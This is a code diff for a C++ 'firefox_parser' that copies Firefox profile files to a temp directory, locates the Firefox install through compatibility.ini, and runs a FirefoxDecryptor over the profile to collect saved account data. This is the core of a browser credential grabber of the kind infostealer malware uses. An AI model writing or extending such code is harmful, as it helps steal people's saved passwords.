@@ -23,19 +23,19 @@ List<AccountData> firefox_parser::collect_data()
 	{
 
 		
-		auto dir_profile = this->get_profile_dir(browser);		
-		auto mozilla_path = this->get_mozilla_program_dir();
-
-		
-
+		auto dir_profile = this->get_profile_dir(browser);	
 		
 		String temp_dir;
 		this->prepare_imports(dir_profile, temp_dir);
+
+
+
+		auto mozilla_path = this->get_mozilla_program_dir(temp_dir);
 		
 		{
 			FirefoxDecryptor decryptor;
 
-			if (!decryptor.init(mozilla_path)) {continue;};
+			if (!decryptor.init(mozilla_path)) {continue;}
 			
 			if (!decryptor.set_profile_dir(temp_dir + "\\")) {  continue; }
 
@@ -109,20 +109,21 @@ String firefox_parser::get_profile_dir(const String& dir_localdata)
 	return "";
 }
 
-String firefox_parser::get_mozilla_program_dir()
+String firefox_parser::get_mozilla_program_dir(const String& temp_dir)
 {
-	auto start_browsers = regedit_helper::get_subkeys(HKEY_LOCAL_MACHINE, R"(SOFTWARE\Clients\StartMenuInternet)");
-	//auto mozilla_browser = regedit_helper::subkeys_contains(start_browsers, "Firefox");
+	const String path_to_ini_file = temp_dir + "\\compatibility.ini";
+	
+	IniParser ini_reader;
+	if (!ini_reader.parseFile(path_to_ini_file)) return "";
 
-	for (auto& key : start_browsers)
+	try
 	{
-		const auto path_to_software= regedit_helper::ReadRegValue(HKEY_LOCAL_MACHINE, key, "ApplicationIcon");
-		if(path_to_software.empty()) continue;
-
-		if (IO::is_file_exists(path_to_software + "\\mozglue.dll") && IO::is_file_exists(path_to_software + "\\nss3.dll")) return path_to_software;	
-			
+		return ini_reader["Compatibility.LastPlatformDir"];
 	}
-
+	catch (...)
+	{
+	}
+	
 	return "";
 }
 
